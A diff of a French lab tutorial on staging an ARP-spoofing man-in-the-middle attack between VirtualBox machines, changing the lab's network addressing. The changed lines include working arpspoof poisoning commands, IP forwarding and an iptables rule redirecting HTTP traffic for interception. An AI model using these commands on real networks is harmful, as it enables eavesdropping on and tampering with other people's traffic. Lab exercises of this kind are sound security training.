@@ -36,10 +36,10 @@ Je vous propose un tutoriel détaillé pour configurer et exécuter une attaque 
 1. **Configurer les adaptateurs réseau** pour chaque machine dans VirtualBox :
    - **Machine Attaquant (Attacker)** :
      - Adapter 1 : Bridge Adapter (pour la connexion à Internet via DHCP)
-     - Adapter 2 : Internal Network (nommé `intnet`)
+     - Adapter 2 : NAT Network (nommé `natnet`, avec l'adresse réseau `10.0.2.0/24`)
    - **Machine Victime 1 (Victim 1)** et **Machine Victime 2 (Victim 2)** :
      - Adapter 1 : Bridge Adapter (pour la connexion à Internet via DHCP)
-     - Adapter 2 : Internal Network (nommé `intnet`)
+     - Adapter 2 : NAT Network (nommé `natnet`, avec l'adresse réseau `10.0.2.0/24`)
 
 #### Configuration des Adresses IP Statiques pour le Réseau Interne
 
@@ -56,7 +56,7 @@ Je vous propose un tutoriel détaillé pour configurer et exécuter une attaque 
            enp0s8:
              dhcp4: no
              addresses:
-               - 192.168.1.10/24
+               - 10.0.2.10/24
              nameservers:
                addresses:
                  - 8.8.8.8
@@ -77,13 +77,13 @@ Je vous propose un tutoriel détaillé pour configurer et exécuter une attaque 
            enp0s8:
              dhcp4: no
              addresses:
-               - 192.168.1.20/24
+               - 10.0.2.20/24
              nameservers:
                addresses:
                  - 8.8.8.8
              routes:
                - to: default
-                 via: 192.168.1.10
+                 via: 10.0.2.10
        ```
      - Appliquez les changements :
        ```sh
@@ -101,13 +101,13 @@ Je vous propose un tutoriel détaillé pour configurer et exécuter une attaque 
            enp0s8:
              dhcp4: no
              addresses:
-               - 192.168.1.30/24
+               - 10.0.2.30/24
              nameservers:
                addresses:
                  - 8.8.8.8
              routes:
                - to: default
-                 via: 192.168.1.10
+                 via: 10.0.2.10
        ```
      - Appliquez les changements :
        ```sh
@@ -117,18 +117,18 @@ Je vous propose un tutoriel détaillé pour configurer et exécuter une attaque 
 2. **Vérifiez la connectivité entre les machines** en utilisant `ping` :
    - Depuis `Attacker` :
      ```sh
-     ping 192.168.1.20
-     ping 192.168.1.30
+     ping 10.0.2.20
+     ping 10.0.2.30
      ```
    - Depuis `Victim1` :
      ```sh
-     ping 192.168.1.10
-     ping 192.168.1.30
+     ping 10.0.2.10
+     ping 10.0.2.30
      ```
    - Depuis `Victim2` :
      ```sh
-     ping 192.168.1.10
-     ping 192.168.1.20
+     ping 10.0.2.10
+     ping 10.0.2.20
      ```
 
 ### Installation des Outils Nécessaires
@@ -163,7 +163,7 @@ Je vous propose un tutoriel détaillé pour configurer et exécuter une attaque 
 
    - Exécutez la commande suivante sur la machine attaquant (`attacker`) :
      ```sh
-     sudo arpspoof -i enp0s8 -t 192.168.1.20 192.168.1.30
+     sudo arpspoof -i enp0s8 -t 10.0.2.20 10.0.2.30
      ```
 
 2. **Empoisonner la Table ARP de Victim2**
@@ -171,7 +171,7 @@ Je vous propose un tutoriel détaillé pour configurer et exécuter une attaque 
    - Ouvrez un nouveau terminal sur `attacker`.
    - Exécutez la commande suivante :
      ```sh
-     sudo arpspoof -i enp0s8 -t 192.168.1.30 192.168.1.20
+     sudo arpspoof -i enp0s8 -t 10.0.2.30 10.0.2.20
      ```
 
 ### Étape 2 : Configurer `iptables` pour Rediriger le Trafic HTTP
@@ -211,8 +211,8 @@ Je vous propose un tutoriel détaillé pour configurer et exécuter une attaque 
 echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
 
 # Empoisonner les tables ARP
-sudo arpspoof -i enp0s8 -t 192.168.1.20 192.168.1.30
-sudo arpspoof -i enp0s8 -t 192.168.1.30 192.168.1.20
+sudo arpspoof -i enp0s8 -t 10.0.2.20 10.0.2.30
+sudo arpspoof -i enp0s8 -t 10.0.2.30 10.0.2.20
 
 # Rediriger le trafic HTTP
 sudo iptables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 80 -j REDIRECT --to-port 8080
@@ -228,9 +228,9 @@ sudo iptables -t nat -F
 
 #### Qu'est-ce qu'une Attaque Man-in-the-Middle (MITM) ?
 
-Imaginez deux amis, Alice (Victim1) et Bob (Victim2), qui échangent des lettres. Mallory (Attacker) est un individu malveillant qui intercepte et lit toutes les lettres échangées entre Alice et Bob, et parfois il modifie le contenu des lettres avant de
+Imaginez deux amis, Alice (Victim1) et Bob (Victim2), qui échangent des lettres. Mallory (Attacker) est
 
- les envoyer à la destination prévue. Une attaque Man-in-the-Middle fonctionne de manière similaire en interceptant les communications entre deux parties.
+ un individu malveillant qui intercepte et lit toutes les lettres échangées entre Alice et Bob, et parfois il modifie le contenu des lettres avant de les envoyer à la destination prévue. Une attaque Man-in-the-Middle fonctionne de manière similaire en interceptant les communications entre deux parties.
 
 #### Comment l'Attaque Fonctionne-t-elle ?
 
